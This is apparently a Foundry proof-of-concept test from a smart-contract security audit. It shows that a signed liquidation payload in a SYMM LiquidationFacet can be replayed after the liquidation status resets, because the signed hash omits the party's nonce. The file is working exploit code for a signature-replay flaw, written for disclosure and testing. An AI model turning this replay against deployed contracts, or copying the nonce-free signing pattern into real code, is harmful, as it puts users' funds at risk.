// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../src/symm/contracts/facets/liquidation/LiquidationFacet.sol";
import "../src/symm/contracts/storages/MuonStorage.sol";
import "../src/symm/contracts/storages/GlobalAppStorage.sol";
import "../src/symm/contracts/storages/MAStorage.sol";
import "../src/symm/contracts/storages/AccountStorage.sol";
import "../src/symm/contracts/libraries/LibAccessibility.sol";

contract LiquidationHarness is LiquidationFacet {
    function grantLiquidator(address account) external {
        GlobalAppStorage.layout().hasRole[account][LibAccessibility.LIQUIDATOR_ROLE] = true;
    }

    // Full liquidation clears this status in LiquidationFacetImpl.  The test
    // helper models that real post-liquidation transition so the same signed
    // payload can be submitted again.
    function completeLiquidation(address partyA) external {
        MAStorage.layout().liquidationStatus[partyA] = false;
    }

    function liquidatorCount(address partyA) external view returns (uint256) {
        return AccountStorage.layout().liquidators[partyA].length;
    }

    function liquidationNonce(address partyA) external view returns (uint256) {
        return AccountStorage.layout().partyANonces[partyA];
    }
}

contract PoC_26346 is Test {
    LiquidationHarness internal liquidation;
    address internal constant PARTY_A = address(0xA11CE);
    address internal constant LIQUIDATOR = address(0xBEEF);

    function setUp() public {
        liquidation = new LiquidationHarness();
        liquidation.grantLiquidator(LIQUIDATOR);
    }

    function _signature() internal view returns (LiquidationSig memory sig) {
        uint256[] memory noSymbols = new uint256[](0);
        sig = LiquidationSig({
            reqId: hex"01",
            timestamp: block.timestamp,
            liquidationId: bytes("same-liquidation-id"),
            upnl: -1,
            totalUnrealizedLoss: -1,
            symbolIds: noSymbols,
            prices: noSymbols,
            gatewaySignature: hex"",
            sigs: SchnorrSign({signature: 1, owner: address(1), nonce: address(2)})
        });
    }

    function test_same_liquidation_signature_replays_after_status_reset() public {
        LiquidationSig memory sig = _signature();

        vm.prank(LIQUIDATOR);
        liquidation.liquidatePartyA(PARTY_A, sig);
        assertEq(liquidation.liquidatorCount(PARTY_A), 1);

        // The production completion path resets liquidationStatus.  It also
        // increments partyANonces, but liquidatePartyA's signed hash omits
        // that nonce, so the old authorization remains valid.
        liquidation.completeLiquidation(PARTY_A);
        assertEq(liquidation.liquidationNonce(PARTY_A), 0);

        vm.prank(LIQUIDATOR);
        liquidation.liquidatePartyA(PARTY_A, sig);

        assertEq(liquidation.liquidatorCount(PARTY_A), 2);
    }
}
